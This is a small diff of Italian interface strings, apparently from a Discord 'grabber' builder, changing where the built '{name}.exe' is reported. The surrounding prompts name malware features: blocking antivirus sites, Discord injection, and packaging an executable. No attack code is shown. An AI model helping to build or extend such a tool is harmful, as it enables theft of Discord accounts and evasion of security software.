@@ -253,7 +253,7 @@ Blocca Siti Av (S/N)
 Iniezione Discord (S/N)
 Icona File
 Creazione {name}.exe, Ci vorranno alcuni secondi. Grazie per la tua pazienza!
-Il file è in 'output/grabberbuilder/{name}.exe
+Il file è in {path}
 Gruppo creato
 Limitato dalla velocità ({response.json()['retry_after']}ms)
 Non ci sono abbastanza amici disponibili per la selezione casuale
